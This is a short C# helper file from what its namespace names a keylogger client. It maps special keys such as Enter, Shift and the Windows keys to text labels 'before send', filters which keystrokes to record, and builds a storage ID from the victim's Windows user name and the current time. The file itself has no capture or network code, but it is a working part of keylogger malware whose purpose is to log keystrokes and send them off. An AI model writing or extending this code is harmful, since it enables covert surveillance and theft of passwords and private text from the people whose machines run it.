using System;
using System.Collections.Generic;
using System.Windows.Forms;

namespace keylogger_client
{
    public static class Helper
    {
        /// <summary>
        /// Common key converter before send
        /// </summary>
        public static Dictionary<Keys, string> CommonKeysConverter = new Dictionary<Keys, string>
        {
            { Keys.Space, " " },
            { Keys.Enter, "[Enter]" },
            { Keys.ShiftKey, "[ShiftKey]" },
            { Keys.Menu, "[AltKey]" },
            { Keys.ControlKey, "[ControlKey]" },
            { Keys.LWin, "[LWindows]" },
            { Keys.RWin, "[RWindows]" },
        };

        /// <summary>
        /// Check if key is writable
        /// </summary>
        /// <param name="key"></param>
        /// <returns></returns>
        public static bool KeyIsWritable(Keys key)
        {
            return (key >= Keys.A && key <= Keys.RWin) || (key >= Keys.Enter && key <= Keys.Menu) || key == Keys.Space;
        }

        /// <summary>
        /// Create specific uid for store data
        /// </summary>
        /// <param name="now"></param>
        /// <returns></returns>
        public static string GetUid(DateTime now)
        {
            var uid = $"{Environment.UserName}-{now.Year}-{now.Month.ToString().PadLeft(2, '0')}-" +
                      $"{now.Day.ToString().PadLeft(2, '0')}-{now.Hour.ToString().PadLeft(2, '0')}-" +
                      $"{now.Minute.ToString().PadLeft(2, '0')}-{now.Second.ToString().PadLeft(2, '0')}";

            return uid;
        }
    }
}
